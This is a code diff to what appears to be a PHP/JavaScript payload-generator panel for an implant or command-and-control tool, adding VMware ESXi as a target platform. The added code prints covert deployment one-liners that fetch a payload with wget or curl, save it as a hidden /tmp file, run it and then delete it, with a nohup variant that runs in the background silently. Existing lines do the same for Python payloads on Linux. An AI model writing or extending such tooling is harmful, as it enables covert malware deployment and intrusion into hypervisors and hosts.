@@ -77,6 +77,7 @@ $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http'
       <option value="win">🖥️ Windows (C# / .NET)</option>
       <option value="linux">🐧 Linux (Python3)</option>
       <option value="macos">🍎 macOS (Python3)</option>
+      <option value="esxi">🖥️ VMware ESXi (Shell)</option>
     </select>
   </div>
 </div>
@@ -296,7 +297,7 @@ function genPayload(){
   fetch('generate.php',{method:'POST',body:fd})
   .then(r=>r.json()).then(d=>{
     if(!d.ok){res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';return;}
-    var pname={'win':'Windows','linux':'Linux','macos':'macOS'}[p]||p;
+    var pname={'win':'Windows','linux':'Linux','macos':'macOS','esxi':'VMware ESXi'}[p]||p;
     var dl='payloads/'+d.file;
     var html='<div class="gen-ok">';
     html+='<i class="fas fa-check-circle"></i> <b>'+pname+'</b> 载荷已就绪: <a href="'+dl+'" download>'+d.file+'</a> ('+d.size+' B)';
@@ -311,6 +312,18 @@ function genPayload(){
         'wget -q '+rurl+' -O /tmp/.j && python3 /tmp/.j && rm -f /tmp/.j\n\n'+
         '# 方式3: 后台静默运行\n'+
         'nohup python3 -c \"$(curl -sL '+rurl+')\" > /dev/null 2>&1 &'+
+        '</pre>';
+    }else if(p==='esxi'){
+      var rurl=location.origin+'/'+dl;
+      html+='<pre class="dt-code" style="margin:0">'+
+        '# ESXi SSH 一键部署\n'+
+        '# 1. 启用 ESXi SSH (Host > Actions > Services > Enable SSH)\n\n'+
+        '# 方式1: wget (ESXi 自带 BusyBox wget)\n'+
+        'wget -q '+rurl+' -O /tmp/.jsh && sh /tmp/.jsh && rm -f /tmp/.jsh\n\n'+
+        '# 方式2: curl (部分版本支持)\n'+
+        'curl -sL '+rurl+' -o /tmp/.jsh && sh /tmp/.jsh && rm -f /tmp/.jsh\n\n'+
+        '# 方式3: 后台运行\n'+
+        'wget -q '+rurl+' -O /tmp/.jsh && nohup sh /tmp/.jsh > /dev/null 2>&1 &'+
         '</pre>';
     }else{
       html+='<pre class="dt-code" style="margin:0">'+
